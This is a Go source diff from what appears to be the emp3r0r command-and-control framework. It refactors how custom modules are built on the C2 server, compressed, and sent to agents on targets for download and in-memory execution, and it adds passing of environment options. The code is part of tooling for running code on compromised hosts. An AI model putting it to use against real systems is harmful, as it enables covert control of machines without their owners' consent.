@@ -28,15 +28,16 @@ func moduleCustom() {
 		return
 	}
 
-	updateModuleOptions(config)
-
 	// build module on C2
-	out, err := build_module(config)
-	if err != nil {
-		LogError("Build module %s: %v", config.Name, err)
-		return
+	if config.Build != "" {
+		LogMsg("Building %s...", config.Name)
+		out, err := build_module(config)
+		if err != nil {
+			LogError("Build module %s: %v", config.Name, err)
+			return
+		}
+		LogMsg("Module output:\n%s", out)
 	}
-	LogMsg("Module output:\n%s", out)
 
 	// if module is a plugin, no need to upload and execute files on target
 	if config.IsLocal {
@@ -59,19 +60,17 @@ func moduleCustom() {
 		exec_cmd = fmt.Sprintf("echo %s", strconv.Quote(tun.SHA256SumRaw([]byte(emp3r0r_def.MagicString))))
 	}
 
+	// if in-memory module
 	if config.AgentConfig.InMemory {
-		handleInMemoryModule(*config, payload_type, download_addr)
+		handleInMemoryModule(*config, payload_type, envStr, download_addr)
 		return
 	}
 
+	// other modules that need to be saved to disk
 	handleCompressedModule(*config, payload_type, exec_cmd, envStr, download_addr)
 }
 
 func build_module(config *emp3r0r_def.ModuleConfig) (out []byte, err error) {
-	if config.Build == "" {
-		return
-	}
-
 	err = os.Chdir(config.Path)
 	if err != nil {
 		return
@@ -87,7 +86,6 @@ func build_module(config *emp3r0r_def.ModuleConfig) (out []byte, err error) {
 	}
 
 	// build module
-	LogInfo("Building %s...", config.Name)
 	out, err = exec.Command("sh", "-c", config.Build).CombinedOutput()
 	if err != nil {
 		err = fmt.Errorf("%s (%v)", out, err)
@@ -95,17 +93,6 @@ func build_module(config *emp3r0r_def.ModuleConfig) (out []byte, err error) {
 	}
 
 	return
-}
-
-func updateModuleOptions(config *emp3r0r_def.ModuleConfig) {
-	for opt, modOption := range config.Options {
-		option, ok := AvailableModuleOptions[opt]
-		if !ok {
-			LogError("Option '%s' not found", opt)
-			return
-		}
-		modOption.Val = option.Val
-	}
 }
 
 func getDownloadAddr() string {
@@ -116,10 +103,16 @@ func getDownloadAddr() string {
 	return ""
 }
 
-func handleInMemoryModule(config emp3r0r_def.ModuleConfig, payload_type, download_addr string) {
+func handleInMemoryModule(config emp3r0r_def.ModuleConfig, payload_type, envStr, download_addr string) {
 	hosted_file := WWWRoot + ActiveModule + ".xz"
 	LogInfo("Compressing %s with xz...", ActiveModule)
-	path := fmt.Sprintf("%s/%s", config.Path, config.AgentConfig.Exec)
+
+	// only one file is allowed
+	if len(config.AgentConfig.Files) == 0 {
+		LogError("No files found for module %s in %s", config.Name, config.Path)
+		return
+	}
+	path := fmt.Sprintf("%s/%s", config.Path, config.AgentConfig.Files[0])
 	data, err := os.ReadFile(path)
 	if err != nil {
 		LogError("Reading %s: %v", path, err)
@@ -136,8 +129,8 @@ func handleInMemoryModule(config emp3r0r_def.ModuleConfig, payload_type, downloa
 		LogError("Writing %s: %v", hosted_file, err)
 		return
 	}
-	cmd := fmt.Sprintf("%s --mod_name %s --type %s --file_to_download %s --checksum %s --in_mem --download_addr %s",
-		emp3r0r_def.C2CmdCustomModule, ActiveModule, payload_type, util.FileBaseName(hosted_file), tun.SHA256SumFile(hosted_file), download_addr)
+	cmd := fmt.Sprintf("%s --mod_name %s --type %s --file_to_download %s --checksum %s --in_mem --download_addr %s --env \"%s\"",
+		emp3r0r_def.C2CmdCustomModule, ActiveModule, payload_type, util.FileBaseName(hosted_file), tun.SHA256SumFile(hosted_file), download_addr, envStr)
 	cmd_id := uuid.NewString()
 	LogDebug("Sending command %s to %s", cmd, ActiveAgent.Tag)
 	err = SendCmdToCurrentTarget(cmd, cmd_id)
@@ -351,7 +344,7 @@ func genModStartCmd(config *emp3r0r_def.ModuleConfig) (payload_type, exec_path, 
 	var builder strings.Builder
 
 	setEnvVar := func(opt, value string) {
-		fmt.Fprintf(&builder, "%s=%s ", opt, value)
+		fmt.Fprintf(&builder, "%s=%s,", opt, value)
 	}
 	for opt, modOption := range config.Options {
 		setEnvVar(opt, modOption.Val)
